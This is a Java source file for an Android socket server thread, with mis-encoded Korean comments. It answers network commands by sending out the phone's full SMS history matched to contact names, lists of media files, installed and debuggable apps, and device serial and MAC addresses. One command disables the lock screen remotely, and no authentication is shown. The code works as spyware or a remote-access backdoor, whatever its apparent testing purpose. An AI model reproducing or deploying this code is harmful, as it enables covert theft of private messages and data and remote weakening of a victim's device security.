/*
 *   ����: ServerThread Ŭ����  
 *   �ۼ���: �ڼ���(adsloader@naver.com)    
 *   �ۼ���: 2010.06.07
 *   ����  : Ŭ���̾�Ʈ ����� 1�� ������ ����--> ��Ŷ Navigation ó�� 
 */

package com.psw;

import java.io.*;
import java.net.*;
import java.sql.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.MediaStore.Images;

import com.psw.util.Util;

// -----------------------------------------------------------------------------------------------------------

public class ServerThread extends Thread {
	Socket clientSocket = null;
	BufferedInputStream m_InputStream;
	BufferedOutputStream m_OutputStream;
	boolean m_IsRun = true;
	
	int m_PORT;
	InetAddress m_IP;
	
	// �ƿ��� Ŭ����(ServerThread)�� ���ҽ��� ����ϱ� ���ؼ� 
	// Packet ó���� ���� InnerClass ����
	class Command {
		void DoWork(Packet p){};
	}
	
	Map<String, Command> m_mapProcess = null;
	
	protected ServerThread(Socket clientSocket) throws IOException {
		this.clientSocket = clientSocket;
	
		m_InputStream = new BufferedInputStream(clientSocket.getInputStream());
		m_OutputStream = new BufferedOutputStream(clientSocket.getOutputStream());
		
		start();

		m_IP = clientSocket.getInetAddress();
		m_PORT = clientSocket.getPort();
		
		// �ڵ鷯 ���
		AddHandler();
	}
	
	
	// Handler ���
	public void AddHandler()
	{
		// Ŀ�ǵ� ���
		m_mapProcess = new HashMap<String, Command>();
		
		m_mapProcess.put("app",   
			new Command(){
		        void DoWork(Packet p){
		        	OnPackageInfo(p);	
		        }
	        }				
		);
		
		m_mapProcess.put("debug",   
			new Command(){
			    void DoWork(Packet p){
			    	OnDebuggableInfo(p);	
		        }
		    }				
		);
		
		m_mapProcess.put("dev",   
			new Command(){
			    void DoWork(Packet p){
			    	OnDeviceSoInfo(p);	
			    }
			}				
		);
		
		m_mapProcess.put("all",   
			new Command(){
			    void DoWork(Packet p){
			    	OnAllApps(p);	
		        }
		    }				
		);
		
		m_mapProcess.put("sms",   
			new Command(){
			    void DoWork(Packet p){
			    	OnSms(p);	
		        }
		    }				
		);
		
		m_mapProcess.put("pic",   
			new Command(){
	            void DoWork(Packet p){
	            	OnGetImages(p);	
	            }
            }				
		);
		
		m_mapProcess.put("mp3",   
			new Command(){
		        void DoWork(Packet p){
		        	OnGetMp3List(p);	
		        }
	        }				
		);
		
		
		m_mapProcess.put("video",   
			new Command(){
		        void DoWork(Packet p){
		        	OnGetVideoList(p);	
		        }
	        }				
		);
		
		m_mapProcess.put("keyguard",   
			new Command(){
		        void DoWork(Packet p){
		        	OnKeyGuard(p);	
		        }
	        }				
		);
		
		
	}
	
	
	// ��Ű�� �� �������� 
	public String getApkName(String packageName, PackageManager manager)
	{
		Intent mainIntent = new Intent(Intent.ACTION_MAIN, null ); 
    	mainIntent.addCategory(Intent.CATEGORY_LAUNCHER); 
    	List<ResolveInfo> appsList = manager.queryIntentActivities(mainIntent, 0);
    	
    	for(ResolveInfo ri : appsList){
    		if( ri.activityInfo.packageName.equals(packageName) ) {
    			return ri.loadLabel(manager).toString();
    		}
    		
    	}
    	
    	return "";
    
	}
	
	// ����� �̸� ��������
	public String getContactName(String phoneNumber)
	{
		Uri uri;
	    String[] projection;
	    
	    String displayName = "";

	    uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
	    projection = new String[] {ContactsContract.PhoneLookup.DISPLAY_NAME};

	    // Query the filter URI
	    Cursor cursor = Util.GetServiceObject().getContentResolver().query(uri, projection, null, null, null);
	    if (cursor != null) {
	        if (cursor.moveToFirst())
	            displayName = cursor.getString(0);

	        cursor.close();
	    }
	    
	    return displayName;
	}
	
	
    
	/******************************************************************************/
	// Handler ����
	
	// Packet ������ ó���Ѵ�.
	public void OnPackageInfo(Packet p) 
	{
		// Data ó��

		PackageManager manager = Util.GetServiceObject().getPackageManager(); 
		String packageName = p.m_data;
		try {
			ApplicationInfo applicationinfo = manager.getApplicationInfo(packageName, PackageManager.GET_META_DATA);
			PackageInfo pInfo = null;
			pInfo  = manager.getPackageInfo(applicationinfo.packageName, 0);
			
			String strDebuggable = "true";
			
			// Debuggable äũ 
            if ( (applicationinfo.flags & ApplicationInfo.FLAG_DEBUGGABLE) == 0 ){
            	strDebuggable = "false";
            }
            
            String sActName = getApkName(packageName, manager);
        
			p.m_data= "".format("[name]%s\r\n[process]%s\r\n[path]%s\r\n[version]%s\r\n[debuggable]%s\r\n[TargetSDK]%d\r\n",
					sActName,
					applicationinfo.processName,
					applicationinfo.sourceDir,
					pInfo.versionName,
					strDebuggable,
					applicationinfo.targetSdkVersion
            );
			
			
		} catch (NameNotFoundException e) {
			p.m_data = "NameNotFoundException";
			e.printStackTrace();
		} 
			
	}
	
	// Packet ������ ó���Ѵ�.
	public void OnDebuggableInfo(Packet p) 
	{
		// Data ó��

		PackageManager manager = Util.GetServiceObject().getPackageManager(); 
		String packageName = p.m_data;
		List<ApplicationInfo> list = manager.getInstalledApplications(PackageManager.GET_META_DATA);
        
		p.m_data = "";
		p.m_data +="<debuggable = true> apk list...\r\n";
		for (ApplicationInfo ai : list) {
			
			// Debuggable äũ 
            if ( (ai.flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0 ){
            	p.m_data +=  ai.packageName + "\r\n"; 
            }
		} 
		
	}
	
	// Packet ������ ó���Ѵ�.
	public void OnAllApps(Packet p) 
	{
		// Data ó��
		PackageManager manager = Util.GetServiceObject().getPackageManager(); 
		String packageName = p.m_data;
		List<ApplicationInfo> list = manager.getInstalledApplications(PackageManager.GET_META_DATA);
        
		p.m_data = "";
		int nCount = 0;
		for (ApplicationInfo ai : list) {
			
			try {
				p.m_data += "".format("(%d)[process]%s\r\n[path]%s\r\n[version]%s\r\n\r\n",
						nCount,
						ai.processName,
						ai.sourceDir,
						manager.getPackageInfo(ai.packageName, 0).versionName
				);
				nCount++;
			} catch (NameNotFoundException e) {
				e.printStackTrace();
			}
			
		} 
	}

	// Packet ������ ó���Ѵ�.
	public void OnDeviceSoInfo(Packet p) 
	{
		
		p.m_data = "";
		p.m_data += "serial:"   + Util.GetSettingInfo( Util.ID_SERIAL) + "\r\n";
		p.m_data += "version:"  + Util.GetSettingInfo( Util.ID_SOFTVERSION) + "\r\n";
		p.m_data += "btmac:"    + Util.GetSettingInfo( Util.ID_BTMAC) + "\r\n";
		p.m_data += "wifimac:"  + Util.GetSettingInfo( Util.ID_WIFIMAC) + "\r\n";
		
		p.m_data += "product:"  + Util.getProp("[ro.product.name]:")      + "\r\n";
		p.m_data += "language:" + Util.getProp("[persist.sys.language]:") + "\r\n";
		p.m_data += "country:"  + Util.getProp("[persist.sys.country]:") + "\r\n";
		p.m_data += "timezone:" + Util.getProp("[persist.sys.timezone]:") + "\r\n";
		
	
	}
	
	// Packet ������ ó���Ѵ�.
	public void OnSms(Packet p) 
	{
		final String MESSAGE_TYPE_INBOX = "1";
		final String MESSAGE_TYPE_SENT = "2";
		final String MESSAGE_TYPE_CONVERSATIONS = "3";
		final String MESSAGE_TYPE_NEW = "new";

		Uri allMessage = Uri.parse("content://sms/");  
	    Cursor cur = Util.GetServiceObject().getContentResolver().query(allMessage, null, null, null, null);
	    int count = cur.getCount();
	    
	    p.m_data = "";
	    p.m_data += "SMS count = " + count + "\r\n";
	    
	    String msg = "";
	    String date = "";
	    String protocol = "";
	    String address  = "";
	    String name     = "";

        int nCount = 0;
	    while (cur.moveToNext()) {
            
	    	address = cur.getString(cur.getColumnIndex("address"));
	    	
	    	try{
	    		name    = getContactName(address);
	        } catch (Exception e){
	    	    e.printStackTrace();	
	    	}
	        
	    	msg = cur.getString(cur.getColumnIndex("body"));
            date = cur.getString(cur.getColumnIndex("date"));
            protocol = cur.getString(cur.getColumnIndex("protocol"));
				
            String type = "��������";
            if (protocol == MESSAGE_TYPE_SENT) type = "��������";
            else if (protocol == MESSAGE_TYPE_INBOX) type = "receive";
            else if (protocol == MESSAGE_TYPE_CONVERSATIONS) type = "conversations"; 
            else if (protocol == null) type = "��������"; 
            
            nCount++;
            p.m_data += Integer.toString(nCount) +"-[Phone:] " + address +"("+ name  +")"+"\r\n[�޽���:] " + msg + "\r\n[Type:] " + type + "\r\n[����:]" 
                     + new Date(new Long(date)).toString() + "\r\n__________________________\r\n";
            
        }
	
    }
	
	// Packet ������ ó���Ѵ�.
	public void OnGetImages (Packet p)
    {
	    
    	Cursor mManagedCursor;
    	
    	mManagedCursor = Util.GetServiceObject().getContentResolver().query(Images.Media.EXTERNAL_CONTENT_URI , null, null, null, null) ;
    	
    	p.m_data = "";
    	if(mManagedCursor != null)
    	{
    		mManagedCursor.moveToFirst();
    		
    		int nSize = mManagedCursor.getColumnCount();
    		
    		while (true)
    		{
    			
    			String data = 
    				mManagedCursor.getString(
    						mManagedCursor.getColumnIndex(
    								Images.ImageColumns.DATA)); // ������ ��Ʈ��. ������ ���
    			String size = 
    				mManagedCursor.getString(
    						mManagedCursor.getColumnIndex(
    								Images.ImageColumns.SIZE)); // ������ ũ��
    			
    			long nFileSize = new Long(size) / 1024;
    			
    			
    			p.m_data += data + "("+ nFileSize +"kb)\r\n"; 
    			
    			
    			if (mManagedCursor.isLast())
    			{
    				p.m_data += "��ü:" + mManagedCursor.getCount();
    				break;
    			}
    			else
    			{
    				mManagedCursor.moveToNext();
    			}
    		}
    	}
    	
    }
	
	// Packet ������ ó���Ѵ�.
	public static void OnGetMp3List(Packet p)
	{
		Cursor cr = Util.GetServiceObject().getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, null, null, null, null);
		p.m_data = "";
		
		try {
			cr.moveToFirst();
			
			for ( int i=0; i<cr.getCount(); i++)
			{
				String sTitle = cr.getString(cr.getColumnIndex(MediaStore.MediaColumns.TITLE));
				String sArtist = cr.getString(cr.getColumnIndex(MediaStore.Audio.Media.ARTIST));
				String sAlbum = cr.getString(cr.getColumnIndex(MediaStore.Audio.Media.ALBUM));
				String sFilePath = cr.getString(cr.getColumnIndex(MediaStore.MediaColumns.DATA));
				
				
				String sFileSize = cr.getString(cr.getColumnIndex(MediaStore.MediaColumns.SIZE));
				
				long nFileSize = new Long(sFileSize) / 1024;
				
				String nodeValue[] = { sTitle, sArtist, sAlbum,   sFilePath, Long.toString(nFileSize) + "kb"	};
				String nodeTitle[] = { "Title:", "Artist:", "�ٹ�:",  "���ϸ�:", "ũ��:"	};
				
				for(int j =0 ; j < nodeValue.length; j++){
					p.m_data +=  nodeTitle[j]  + nodeValue[j] + "\r\n";	
				}
				p.m_data += "\r\n"; 
				
				cr.moveToNext();
			}		
			cr.close();
			
			p.m_data += "��ü:" + cr.getCount();
			
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			
		}
		
	}
	
	// Packet ������ ó���Ѵ�.
	public static void OnGetVideoList(Packet p)
	{
		
		Cursor cr = Util.GetServiceObject().getContentResolver().query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, null, null, null, null);
		p.m_data = "";
		
		try {
			cr.moveToFirst();
			
			for ( int i=0; i<cr.getCount(); i++)
			{
				String sTitle = cr.getString(cr.getColumnIndex(MediaStore.MediaColumns.TITLE));
				String sArtist = cr.getString(cr.getColumnIndex(MediaStore.Video.VideoColumns.ARTIST));
				String sAlbum = cr.getString(cr.getColumnIndex(MediaStore.Video.VideoColumns.ALBUM));
				String sFilePath = cr.getString(cr.getColumnIndex(MediaStore.MediaColumns.DATA));
				String sDuration = cr.getString(cr.getColumnIndex(MediaStore.Video.Media.DURATION));
				
				long nMinute = new Long(sDuration) / (60 * 1000);
				long nSec    = new Long(sDuration) % (60 * 1000);
				
				sDuration = String.format("%d �� %d��", nMinute, nSec / 1000);
				
				
				String sFileSize = cr.getString(cr.getColumnIndex(MediaStore.MediaColumns.SIZE));
				
				long nFileSize = new Long(sFileSize) / 1024;
				
				String nodeValue[] = { sTitle, sArtist, sAlbum,  sDuration,  sFilePath, Long.toString(nFileSize) + "kb"	};
				String nodeTitle[] = { "Title:", "Artist:", "�ٹ�:", "�Ⱓ:" , "���ϸ�:", "ũ��:"	};
				
				for(int j =0 ; j < nodeValue.length; j++){
					p.m_data +=  nodeTitle[j]  + nodeValue[j] + "\r\n";	
				}
				p.m_data += "\r\n"; 
				
				cr.moveToNext();
			}		
			cr.close();
			
			p.m_data += "��ü:" + cr.getCount();
			
		} catch (Exception e) {
			e.printStackTrace();
			
		}
		
	}
	
	// Packet ������ ó���Ѵ�.
	public static void OnKeyGuard(Packet p)
	{
		
		KeyguardManager.KeyguardLock keyLock = Util.GetKeyguardLockObject();
		if(p.m_data.equals("off") ){
			keyLock.disableKeyguard(); //���� ����ũ�� ����	
			p.m_data = "lockscreen off";
			
			
		} else if(p.m_data.equals("on") ){
			
			keyLock.reenableKeyguard();
			p.m_data = "lockscreen on";
		} else{
			
			p.m_data = "you must choice defined command(on or off)";
		}
		
	}
	
	/******************************************************************************/
	
	public void run() {
		while (!this.interrupted() && m_IsRun) {
			try {
				
				Packet m_RcvPkt = new Packet();

				// ��Ʈ������ ����Ǿ��°�?
				if (m_RcvPkt.Recive(m_InputStream) == -1) {
					m_IsRun = false;
					EndProcess();
					return;
				}
				
				// ��Ŷ �м�
				Command c = m_mapProcess.get(m_RcvPkt.m_keyword);
				if (c != null) {
					c.DoWork(m_RcvPkt);
					m_RcvPkt.Send(m_OutputStream);
					
				} else{
					m_IsRun = false;
					EndProcess();
				}
				
			}
			catch(Exception e)
			{
				e.printStackTrace();
				m_IsRun = false;
				EndProcess();
			}
		}
	}


	// ���� �޼ҵ�
	synchronized public void EndProcess() {
		try {
			if (m_InputStream != null)
				m_InputStream.close();
			if (m_OutputStream != null)
				m_OutputStream.close();
			if (clientSocket != null)
				clientSocket.close();

		} catch (IOException ie) {
			ie.printStackTrace();
		}

		m_InputStream = null;
		m_OutputStream = null;
		clientSocket = null;
	}

}
